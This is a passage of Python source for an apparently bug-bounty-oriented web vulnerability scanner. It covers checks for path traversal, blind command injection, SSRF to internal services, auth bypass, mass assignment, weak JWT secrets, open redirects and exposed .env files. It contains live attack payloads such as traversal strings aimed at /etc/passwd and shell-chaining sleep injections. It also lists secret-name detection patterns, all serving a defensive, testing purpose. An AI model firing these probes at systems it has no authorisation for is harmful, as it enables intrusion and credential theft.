    findings dict - same convention as check_idor_candidate and
    check_waf_fingerprint. Spotting a serialized blob proves the app
    deserializes attacker-reachable data, which is a strong RCE
    candidate, but actually confirming exploitability requires building
    and firing a gadget chain specific to whatever's on the classpath/
    installed packages - real exploitation work this scanner isn't
    going to attempt. This just tells you where to point ysoserial (or
    equivalent) by hand.
    """
    parsed = httpx.URL(url)
    candidates: list[str] = list(parsed.params.values())

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: deserialization signature check failed for %s: %s", url, exc)
        return None

    set_cookie = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else [resp.headers.get("set-cookie", "")]
    for raw_cookie in set_cookie:
        if "=" in raw_cookie:
            candidates.append(raw_cookie.split("=", 1)[1].split(";")[0])

    for value in candidates:
        if not value:
            continue
        try:
            decoded_bytes = base64.b64decode(value + "=" * (-len(value) % 4), validate=True)
            decoded_str = value  # keep original for regex on the base64 forms
        except Exception:
            decoded_bytes = b""
            decoded_str = value

        for pattern, label in _DESERIALIZATION_SIGNATURES:
            if pattern.match(decoded_str) or (decoded_bytes and pattern.match(decoded_bytes.decode("latin-1", errors="ignore"))):
                return f"{url}: possible {label} found in a cookie/param value - candidate for manual gadget-chain testing"
    return None


# ---------------------------------------------------------------------
# 37. Path traversal / local file inclusion
# ---------------------------------------------------------------------
_PATH_TRAVERSAL_PROBES = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
]
# root:x:0:0: is the start of /etc/passwd's first (root) line on every
# Linux distro - about as unique a proof string as exists. [extensions]
# is the start of a genuine win.ini file, for the Windows probe.
_PATH_TRAVERSAL_SIGNATURES = ["root:x:0:0:", "[extensions]", "[fonts]"]


async def check_path_traversal_lfi(url: str) -> dict | None:
    """
    Tries each query parameter with a handful of directory-traversal
    encodings pointed at /etc/passwd (or win.ini for Windows targets),
    and checks for the exact first-line signature of that file. Proof
    bar: the signature must be ABSENT from a baseline (unmodified)
    request first - same discipline as check_sqli_error_based and the
    fixed check_ssti, after that false-positive taught the lesson the
    hard way. root:x:0:0: is about as unlikely to appear coincidentally
    as a string gets, but the baseline check costs one extra request and
    removes any doubt.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                for probe in _PATH_TRAVERSAL_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    for sig in _PATH_TRAVERSAL_SIGNATURES:
                        if sig in resp.text and sig not in baseline_body:
                            return {
                                "vuln_type": "path_traversal_lfi",
                                "severity": "critical",
                                "evidence": (
                                    f"{test_url}: parameter '{param_name}' with traversal probe "
                                    f"{probe!r} returned a response containing {sig!r} (absent "
                                    f"from the unmodified baseline response) - confirmed local "
                                    f"file read."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: path traversal check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 38. OS command injection (blind, timing-based)
# ---------------------------------------------------------------------
_CMDI_DELAY_SECONDS = 6
_CMDI_PAYLOAD_TEMPLATES = [
    ";sleep {delay};",
    "|sleep {delay}|",
    "$(sleep {delay})",
    "`sleep {delay}`",
    "|| ping -n {delay} 127.0.0.1 ||",  # Windows fallback (ping as a delay primitive)
]
_CMDI_CONTROL_TEMPLATE = ";sleep 0;"


async def check_os_command_injection(url: str) -> dict | None:
    """
    Same three-request discipline as check_blind_sqli_timing (baseline,
    delayed payload, zero-delay control on the same parameter) but with
    shell command-chaining payloads instead of SQL. The control request
    is what rules out "the server/network was just slow right then" -
    if the zero-delay version comes back fast while the sleep() version
    doesn't, that's the shell actually executing our injected command,
    not jitter.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None
    param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]

    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0), verify=False) as client:
            t0_start = time.monotonic()
            await client.get(url)
            baseline = time.monotonic() - t0_start

            for param in param_names:
                for payload_template in _CMDI_PAYLOAD_TEMPLATES:
                    payload = payload_template.format(delay=_CMDI_DELAY_SECONDS)
                    mutated = _replace_query_param(parsed, query_params, param, payload)

                    t1_start = time.monotonic()
                    try:
                        await client.get(mutated)
                    except httpx.TimeoutException:
                        pass
                    elapsed_delayed = time.monotonic() - t1_start

                    if elapsed_delayed < baseline + (_CMDI_DELAY_SECONDS - 1.0):
                        continue

                    control_url = _replace_query_param(
                        parsed, query_params, param, _CMDI_CONTROL_TEMPLATE
                    )
                    t2_start = time.monotonic()
                    await client.get(control_url)
                    elapsed_control = time.monotonic() - t2_start

                    if elapsed_control < baseline + 2.0:
                        return {
                            "vuln_type": "os_command_injection",
                            "severity": "critical",
                            "evidence": (
                                f"{url} param '{param}': baseline={baseline:.1f}s, "
                                f"payload {payload_template!r} with sleep({_CMDI_DELAY_SECONDS})="
                                f"{elapsed_delayed:.1f}s, zero-delay control={elapsed_control:.1f}s. "
                                f"Timing consistently follows the injected delay - confirmed OS "
                                f"command injection."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: OS command injection check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 39. Publicly-listable cloud storage bucket
# ---------------------------------------------------------------------
_BUCKET_REFERENCE_RE = re.compile(
    r"(?:([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com"
    r"|s3\.amazonaws\.com/([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])"
    r"|storage\.googleapis\.com/([a-z0-9][a-z0-9._\-]{1,61}[a-z0-9])"
    r"|([a-z0-9][a-z0-9._\-]{1,61}[a-z0-9])\.storage\.googleapis\.com)",
    re.IGNORECASE,
)
_BUCKET_LISTING_SIGNATURES = ["<ListBucketResult", "\"kind\": \"storage#objects\"", "\"items\":"]


async def check_cloud_storage_bucket_exposure(url: str) -> dict | None:
    """
    Scans a page's body for S3/GCS bucket references (in script tags,
    image URLs, config blobs - anywhere a bucket name shows up in
    plaintext), then issues a direct, read-only GET against that
    bucket's own listing endpoint. Fires only if the bucket responds
    with an actual object listing body (ListBucketResult / GCS's
    "items" JSON) - a 403 AccessDenied response, which is the normal/
    secure case, does not match and is correctly ignored.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.get(url)
            except httpx.HTTPError:
                return None
            body = resp.text

            seen_buckets: set[str] = set()
            for match in _BUCKET_REFERENCE_RE.finditer(body):
                bucket_name = next((g for g in match.groups() if g), None)
                if not bucket_name or bucket_name.lower() in seen_buckets:
                    continue
                seen_buckets.add(bucket_name.lower())

                for listing_url in (
                    f"https://{bucket_name}.s3.amazonaws.com/",
                    f"https://storage.googleapis.com/{bucket_name}/",
                ):
                    try:
                        listing_resp = await client.get(listing_url)
                    except httpx.HTTPError:
                        continue
                    listing_body = listing_resp.text[:3000]
                    if any(sig in listing_body for sig in _BUCKET_LISTING_SIGNATURES):
                        return {
                            "vuln_type": "publicly_listable_cloud_storage_bucket",
                            "severity": "high",
                            "evidence": (
                                f"Bucket '{bucket_name}' (referenced on {url}) is publicly "
                                f"listable at {listing_url} - returned an actual object "
                                f"listing instead of an access-denied response."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: cloud storage bucket check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 40. Exposed .env file
# ---------------------------------------------------------------------
_ENV_FILE_SIGNATURES = [
    "DB_PASSWORD=", "DATABASE_URL=", "APP_KEY=", "AWS_SECRET_ACCESS_KEY=",
    "SECRET_KEY=", "STRIPE_SECRET=", "API_KEY=", "MAIL_PASSWORD=",
]


async def check_env_file_exposure(host: str) -> dict | None:
    """
    Direct check for a publicly-accessible .env file at the host root.
    Distinct from check_git_exposure (batch 3): many deployments that
    correctly block .git access still leave a bare .env sitting in the
    web root with no access control at all - different misconfiguration,
    same "here's every credential the app has" outcome. Only fires on a
    recognized KEY=VALUE secret-shaped line, not just a 200 on /.env
    (which could be an empty file or an unrelated page on a server that
    200s everything).
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                resp = await client.get(base + "/.env")
            except httpx.HTTPError:
                return None
            if resp.status_code != 200:
                return None
            body = resp.text[:5000]
            for sig in _ENV_FILE_SIGNATURES:
                if sig in body:
                    return {
                        "vuln_type": "exposed_env_file",
                        "severity": "critical",
                        "evidence": (
                            f"{base}/.env is publicly accessible and contains a recognized "
                            f"secret-shaped line (matched on {sig!r} prefix) - full "
                            f"application credentials exposed."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: .env exposure check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 41. DOM XSS sink flagging (recon-only - see module docstring)
# ---------------------------------------------------------------------
_DOM_XSS_SOURCES = ["location.hash", "location.search", "location.href", "document.URL",
                     "document.referrer", "window.name"]
_DOM_XSS_SINKS = ["innerHTML", "outerHTML", "document.write(", "document.writeln(",
                   "eval(", "insertAdjacentHTML("]


async def check_dom_xss_sink_flagging(url: str) -> str | None:
    """
    Downloads a JS bundle and flags it if it contains BOTH a known
    attacker-controllable source (location.hash, document.referrer, etc.)
    and a known dangerous sink (innerHTML, eval, document.write) within
    the same file. Returns a plain string, NOT a findings dict - same
    convention as check_idor_candidate and check_waf_fingerprint.
    Confirming actual DOM XSS requires tracing real taint flow from the
    specific source to the specific sink (the source's value has to
    actually reach the sink unsanitized), which static keyword presence
    can't prove - a file can easily use both independently with no
    connection between them. This flags candidates worth a manual
    browser-based check (or a proper taint-analysis tool), not a
    verdict.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: DOM XSS sink check failed for %s: %s", url, exc)
        return None

    body = resp.text
    found_sources = [s for s in _DOM_XSS_SOURCES if s in body]
    found_sinks = [s for s in _DOM_XSS_SINKS if s in body]
    if found_sources and found_sinks:
        return (
            f"{url}: contains both attacker-controllable source(s) "
            f"({', '.join(found_sources[:3])}) and dangerous sink(s) "
            f"({', '.join(found_sinks[:3])}) - candidate for manual DOM XSS "
            f"taint-flow verification (static match only, source->sink "
            f"connection not confirmed)"
        )
    return None


# ---------------------------------------------------------------------
# 42. Authorization bypass via HTTP method/path override headers
# ---------------------------------------------------------------------
_METHOD_OVERRIDE_HEADER_SETS = [
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
]
# Generic "you need to log in" pages are the main false-positive risk for
# this check - a login page can easily be under 200 chars of real content
# once markup is stripped, so anything this short is treated as
# still-blocked rather than a genuine bypass.
_MIN_BYPASS_BODY_LENGTH = 200


async def check_auth_bypass_via_method_override(url: str) -> dict | None:
    """
    Some reverse proxies / app frameworks honor X-HTTP-Method-Override,
    X-Original-URL, or X-Rewrite-URL headers meant for legitimate REST
    tunneling, but apply access-control checks BEFORE processing them -
    so a request that's correctly blocked on the real method/path can
    slip through when the override header points somewhere the
    authorization layer never inspected.

    Proof bar is a clean status-code transition, not a substring match:
    the plain request must come back 401/403 (confirmed blocked), and an
    override-header request to the exact same URL must come back 200
    with a non-trivial body (not just a same-length login/error page).
    This is deterministic - no coincidental-string risk at all, unlike
    several batch 7-9 checks that needed a later audit fix.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None  # not blocked to begin with - nothing to bypass

            for headers in _METHOD_OVERRIDE_HEADER_SETS:
                try:
                    resp = await client.get(url, headers=headers)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "auth_bypass_method_override",
                        "severity": "critical",
                        "evidence": (
                            f"{url}: plain request returned {baseline_resp.status_code} "
                            f"(blocked), but adding header(s) {headers} returned 200 with a "
                            f"{len(resp.text)}-byte body - authorization check is being "
                            f"bypassed by an override header the access-control layer doesn't "
                            f"account for."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: method override auth bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 43. Sensitive query-string data leaking via Referer (missing Referrer-Policy)
# ---------------------------------------------------------------------
_SENSITIVE_PARAM_NAME_RE = re.compile(
    r"^(token|session|sessionid|auth|api[_-]?key|apikey|access[_-]?token|"
    r"reset[_-]?token|password|secret|otp|code)$",
    re.IGNORECASE,
)
_EXTERNAL_RESOURCE_RE = re.compile(
    r'(?:src|href)=["\']https?://([^/"\']+)', re.IGNORECASE
)


async def check_referrer_policy_sensitive_leak(url: str) -> dict | None:
    """
    If a URL's own query string contains a sensitive-looking parameter
    (token, session id, reset code, etc.) AND the page both lacks a
    restrictive Referrer-Policy header/meta tag AND loads at least one
    resource from a third-party origin, the full URL - including that
    sensitive value - gets sent in the Referer header to that third
    party by default browser behavior. This is a structural check (are
    the ingredients for the leak present), not a live confirmation that
    a specific third party received it, so it's a real but analyst-
    verifiable finding rather than something claiming certainty beyond
    what was actually observed.
    """
    parsed = httpx.URL(url)
    query_params = dict(parsed.params)
    sensitive_params = [p for p in query_params if _SENSITIVE_PARAM_NAME_RE.match(p)]
    if not sensitive_params:
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: referrer policy check failed for %s: %s", url, exc)
        return None

    policy_header = resp.headers.get("referrer-policy", "").strip().lower()
    restrictive_policies = {"no-referrer", "same-origin", "strict-origin", "strict-origin-when-cross-origin"}
    if policy_header in restrictive_policies:
        return None

    body = resp.text
    if "referrer-policy" in body.lower() and re.search(
        r'<meta[^>]+name=["\']referrer["\'][^>]+content=["\'](?:no-referrer|same-origin|strict-origin)',
        body, re.IGNORECASE,
    ):
        return None  # restrictive policy set via meta tag instead of header

    own_host = parsed.host
    external_hosts = {
        h for h in _EXTERNAL_RESOURCE_RE.findall(body)
        if h.split(":")[0] != own_host
    }
    if not external_hosts:
        return None

    return {
        "vuln_type": "sensitive_data_referrer_leak",
        "severity": "medium",
        "evidence": (
            f"{url}: query string contains sensitive-looking parameter(s) "
            f"{sensitive_params}, no restrictive Referrer-Policy is set "
            f"(header value: {policy_header!r}), and the page loads resources from "
            f"{len(external_hosts)} third-party origin(s) (e.g. {next(iter(external_hosts))}) "
            f"- the full URL including the sensitive value would be sent to those origins "
            f"via the Referer header under default browser behavior."
        ),
    }


# ---------------------------------------------------------------------
# 44. GraphQL schema leak via field-suggestion errors (introspection disabled)
# ---------------------------------------------------------------------
_GRAPHQL_SUGGESTION_QUERY = '{"query": "{ swasNonexistentFieldProbe }"}'
_GRAPHQL_SUGGESTION_RE = re.compile(r'Did you mean ["\']?(\w+)["\']?', re.IGNORECASE)


async def check_graphql_field_suggestion_leak(url: str) -> dict | None:
    """
    Complements check_graphql_introspection (batch 1): some APIs
    correctly disable introspection but leave "did you mean X?"
    suggestion errors turned on, which leaks real field/type names one
    query at a time even without a working __schema query. Sends one
    deliberately-invalid field name and checks for that specific
    suggestion-error format - a fixed, distinctive GraphQL error phrase,
    not a generic string, so this doesn't need baseline diffing the way
    the batch 7/9 substring-based checks did.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.post(
                    url,
                    content=_GRAPHQL_SUGGESTION_QUERY,
                    headers={"Content-Type": "application/json"},
                )
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: GraphQL field suggestion check failed for %s: %s", url, exc)
        return None

    match = _GRAPHQL_SUGGESTION_RE.search(resp.text)
    if match:
        return {
            "vuln_type": "graphql_field_suggestion_schema_leak",
            "severity": "low",
            "evidence": (
                f"{url}: querying a deliberately nonexistent field returned a "
                f"\"Did you mean {match.group(1)!r}\" suggestion error, revealing a real "
                f"schema field name even though introspection itself may be disabled."
            ),
        }
    return None


# ---------------------------------------------------------------------
# 45. JWT weak/common HMAC signing secret
# ---------------------------------------------------------------------
_JWT_WEAK_SECRETS = [
    "secret", "123456", "password", "changeme", "your-256-bit-secret",
    "jwt_secret", "jwtsecret", "supersecret", "test", "admin", "key",
    "development", "production", "s3cr3t", "secretkey", "mysecret",
]
_JWT_HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


async def check_jwt_weak_secret(url: str) -> dict | None:
    """
    Finds a JWT in the response (same search as check_jwt_alg_confusion)
    and, for HMAC-signed tokens (HS256/384/512), tries to recompute the
    signature locally against a short list of common weak secrets.

    This is fundamentally different from every substring-matching check
    in this file: it makes NO additional requests to the target and
    never forges/replays a token - it's pure local cryptography. A
    secret either reproduces the exact byte-for-byte signature or it
    doesn't; there's no "coincidentally looks similar" middle ground the
    way a text substring can coincidentally appear. Zero false-positive
    risk by construction, not by discipline.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT weak secret check failed for %s: %s", url, exc)
        return None

    haystack = resp.text[:20000] + " " + resp.headers.get("set-cookie", "")
    match = _JWT_RE.search(haystack)
    if not match:
        return None

    token = match.group(0)
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_b64, payload_b64, signature_b64 = parts

    try:
        header = json.loads(base64.urlsafe_b64decode(header_b64 + "=" * (-len(header_b64) % 4)))
    except Exception:
        return None

    alg = str(header.get("alg", "")).upper()
    hash_fn = _JWT_HMAC_ALGS.get(alg)
    if hash_fn is None:
        return None  # RS256/ES256/etc. - not crackable this way, needs the private key

    try:
        actual_sig = base64.urlsafe_b64decode(signature_b64 + "=" * (-len(signature_b64) % 4))
    except Exception:
        return None

    signing_input = f"{header_b64}.{payload_b64}".encode()
    for secret in _JWT_WEAK_SECRETS:
        computed_sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        if hmac.compare_digest(computed_sig, actual_sig):
            return {
                "vuln_type": "jwt_weak_signing_secret",
                "severity": "critical",
                "evidence": (
                    f"{url}: the JWT's {alg} signature was successfully recomputed locally "
                    f"using a common weak secret ({secret!r}) - full authentication bypass, "
                    f"anyone who knows this secret can forge valid tokens for any user or role."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 46. Open redirect via encoding/parsing bypass
# ---------------------------------------------------------------------
_OPEN_REDIRECT_ENCODED_PAYLOADS = [
    "/\\evil-swas-redirect-probe.test",
    "//evil-swas-redirect-probe.test",
    "/%09/evil-swas-redirect-probe.test",
    "/%2f%2fevil-swas-redirect-probe.test",
    "https:evil-swas-redirect-probe.test",
]
_REDIRECT_PARAM_NAME_RE = re.compile(r"url|redirect|next|return|dest|continue|target", re.IGNORECASE)


async def check_open_redirect_encoding_bypass(url: str) -> dict | None:
    """
    Complements check_open_redirect (batch 1) with encoding/parsing-trick
    variants - backslash-as-slash, double-slash, tab-injected slash,
    percent-encoded slashes, scheme-relative confusion - that a naive
    "starts with http(s):// or //" validator often misses even when it
    correctly blocks the plain forms.

    Proof bar: the Location header of an actual redirect response must
    resolve to a domain we chose (evil-swas-redirect-probe.test) -
    deterministic string matching against a known value, not a
    coincidental substring.

    Open redirect findings are frequently rated Informative or low-
    severity on bug bounty programs unless chained with additional
    impact (OAuth token leakage, login CSRF) - worth checking program
    policy before treating a hit here as automatically report-worthy.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)
    redirect_params = [p for p in existing_params if _REDIRECT_PARAM_NAME_RE.search(p)]
    if not redirect_params:
        return None

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            for param_name in redirect_params:
                for payload in _OPEN_REDIRECT_ENCODED_PAYLOADS:
                    test_params = dict(existing_params)
                    test_params[param_name] = payload
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    location = resp.headers.get("location", "")
                    if resp.status_code in (301, 302, 303, 307, 308) and "evil-swas-redirect-probe.test" in location:
                        return {
                            "vuln_type": "open_redirect_encoding_bypass",
                            "severity": "medium",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with encoding-trick "
                                f"payload {payload!r} produced a {resp.status_code} redirect to "
                                f"Location: {location!r} - a naive prefix/domain validator was "
                                f"bypassed. Note: open redirect is commonly rated Informative "
                                f"without demonstrated chained impact - check program policy."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: open redirect encoding bypass check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 47. Missing Subresource Integrity on third-party scripts (recon-only)
# ---------------------------------------------------------------------
_SCRIPT_SRC_TAG_RE = re.compile(r'<script[^>]+src=["\']https?://([^/"\']+)[^"\']*["\'][^>]*>', re.IGNORECASE)


async def check_missing_sri(url: str) -> str | None:
    """
    Flags third-party <script src="https://..."> tags that lack an
    integrity= (SRI) attribute. Returns a plain string, NOT a findings
    dict - missing Subresource Integrity is real but low-signal on its
    own: most bug bounty programs treat "missing security attribute"
    categories as Informative absent a demonstrated supply-chain
    compromise, same reasoning already applied to check_csp_weakness
    and check_waf_fingerprint in this file. Recon note, not a submit-
    as-is finding.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: SRI check failed for %s: %s", url, exc)
        return None

    body = resp.text
    own_host = httpx.URL(url).host
    missing_hosts = set()
    for tag_match in _SCRIPT_SRC_TAG_RE.finditer(body):
        full_tag = tag_match.group(0)
        third_party_host = tag_match.group(1).split(":")[0]
        if third_party_host == own_host:
            continue
        if "integrity=" not in full_tag.lower():
            missing_hosts.add(third_party_host)

    if missing_hosts:
        hosts_list = sorted(missing_hosts)[:5]
        return (
            f"{url}: third-party <script> tag(s) from {', '.join(hosts_list)} load without a "
            f"Subresource Integrity attribute - supply-chain risk if that origin is ever "
            f"compromised, but typically Informative on its own without demonstrated impact"
        )
    return None


# ---------------------------------------------------------------------
# 48. Exposed admin/management panel (recon-only)
# ---------------------------------------------------------------------
_ADMIN_PANEL_PATHS = [
    "/admin", "/admin/login", "/wp-admin", "/administrator", "/manage",
    "/management", "/cpanel", "/admin.php", "/backend", "/console",
]
_LOGIN_FORM_INDICATORS = ['type="password"', "type='password'", 'name="password"', "name='password'"]


async def check_exposed_admin_panel(host: str) -> str | None:
    """
    Checks a short list of common admin/management panel paths for a
    live login form (a password input field present). Returns a plain
    string, NOT a findings dict, and deliberately never attempts any
    credentials - credential guessing/brute force is excluded by most
    bug bounty programs' policies regardless of how the panel was
    located. This only confirms an admin interface is reachable, useful
    for manual review (should this be public? any other issues on the
    panel itself?), not a vulnerability by itself.
    """
    base = host.rstrip("/")
    found_paths = []
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for path in _ADMIN_PANEL_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200:
                    body_lower = resp.text[:5000].lower()
                    if any(ind in body_lower for ind in _LOGIN_FORM_INDICATORS):
                        found_paths.append(path)
    except httpx.HTTPError as exc:
        logger.info("detective: admin panel check failed for %s: %s", host, exc)
        return None

    if found_paths:
        return (
            f"{base}: admin/management login panel(s) reachable at {', '.join(found_paths)} - "
            f"worth manual review; credential testing not attempted, most programs exclude "
            f"brute force/credential guessing regardless of how the panel was located"
        )
    return None


# ---------------------------------------------------------------------
# 49. SSRF-driven internal port/service fingerprinting
# ---------------------------------------------------------------------
_SSRF_INTERNAL_PORT_PROBES = [
    ("http://127.0.0.1:6379/", "redis"),
    ("http://127.0.0.1:9200/", "elasticsearch"),
    ("http://127.0.0.1:27017/", "mongodb"),
    ("http://127.0.0.1:2379/version", "etcd"),
    ("http://127.0.0.1:8500/v1/status/leader", "consul"),
]
_SSRF_SERVICE_BANNERS = {
    "redis": ["-ERR", "-NOAUTH", "-WRONGTYPE"],
    "elasticsearch": ['"cluster_name"', '"tagline" : "You Know, for Search"'],
    "mongodb": ["It looks like you are trying to access MongoDB"],
    "etcd": ["etcdcluster", '"etcdserver"'],
    "consul": ['"Leader"', "consul"],
}


async def check_ssrf_internal_port_scan(url: str) -> dict | None:
    """
    Same reflected-SSRF technique and parameter names as
    check_ssrf_reflected (batch 7), but probing common internal service
    ports (Redis, Elasticsearch, MongoDB, etcd, Consul) instead of the
    cloud metadata endpoint. If the app fetches these server-side and
    reflects the response, that's SSRF being used to fingerprint what's
    reachable on the internal network - a real, chainable finding even
    without cloud metadata being the target.

    Baseline-diffed against an unmodified request first, same discipline
    as the fixed check_ssrf_reflected - these banner strings are
    reasonably distinctive but not immune to coincidence without it.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000]
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                for probe_url, service in _SSRF_INTERNAL_PORT_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe_url
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    body = resp.text[:3000]
                    for banner in _SSRF_SERVICE_BANNERS[service]:
                        if banner in body and banner not in baseline_body:
                            return {
                                "vuln_type": "ssrf_internal_service_fingerprinting",
                                "severity": "high",
                                "evidence": (
                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
                                    f"pointed at {probe_url} and the response body contains a "
                                    f"{service} banner ({banner!r}, absent from baseline) - SSRF "
                                    f"confirmed reachable to an internal {service} instance."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: SSRF internal port scan failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 50. Mass assignment / privilege escalation via extra JSON fields
# ---------------------------------------------------------------------
_MASS_ASSIGNMENT_PAYLOAD = {
    "username": "swas_mass_assignment_probe",
    "isAdmin": True,
    "is_admin": True,
    "role": "admin",
    "admin": True,
}


async def check_mass_assignment_privilege_escalation(url: str) -> dict | None:
    """
    POSTs a JSON body containing ordinary-looking fields alongside
    several common privilege-escalation field names (isAdmin, role,
    admin) to the given URL, then checks whether the response echoes
    ANY of those privileged fields back with the EXACT value we sent.
    That's evidence the server accepted and processed an attribute the
    client shouldn't be able to set directly - the classic mass-
    assignment pattern. Evidence is worded as "accepted/echoed", not
    "confirmed escalated" - echoing a field back is strong signal but
    isn't the same as verifying the account's actual privilege level
    changed server-side, which would need a follow-up authenticated
    request this stateless check doesn't make.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                resp = await client.post(url, json=_MASS_ASSIGNMENT_PAYLOAD)
            except httpx.HTTPError:
                return None
    except httpx.HTTPError as exc:
        logger.info("detective: mass assignment check failed for %s: %s", url, exc)
        return None

    try:
        response_json = resp.json()
    except Exception:
        return None
    if not isinstance(response_json, dict):
        return None

    for field in ("isAdmin", "is_admin", "role", "admin"):
        if field in response_json and response_json[field] == _MASS_ASSIGNMENT_PAYLOAD[field]:
            return {
                "vuln_type": "mass_assignment_privilege_escalation",
                "severity": "high",
                "evidence": (
                    f"{url}: POSTing a JSON body with an unexpected privileged field "
                    f"'{field}': {_MASS_ASSIGNMENT_PAYLOAD[field]!r} resulted in that exact "
                    f"field/value being echoed back in the response - the endpoint accepts "
                    f"and processes client-supplied privilege fields it shouldn't expose."
                ),
            }
    return None


# ---------------------------------------------------------------------
# 51. Authorization bypass via HTTP verb tampering
# ---------------------------------------------------------------------
_VERB_TAMPERING_METHODS = ["PUT", "DELETE", "PATCH", "TRACE", "HEAD"]


async def check_auth_bypass_via_verb_tampering(url: str) -> dict | None:
    """
    Complements check_auth_bypass_via_method_override (batch 11) with
    the other common technique for the same underlying bug class: some
    access-control layers only inspect GET/POST, so a protected endpoint
    correctly blocks GET but never checks PUT/DELETE/PATCH at all. Same
    deterministic proof bar as the override-header check - a clean
    401/403 baseline, then a real 200 with substantial content on a
    different verb - no substring-matching risk.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            try:
                baseline_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if baseline_resp.status_code not in (401, 403):
                return None

            for method in _VERB_TAMPERING_METHODS:
                try:
                    resp = await client.request(method, url)
                except httpx.HTTPError:
                    continue
                if resp.status_code == 200 and len(resp.text) >= _MIN_BYPASS_BODY_LENGTH:
                    return {
                        "vuln_type": "auth_bypass_verb_tampering",
                        "severity": "critical",
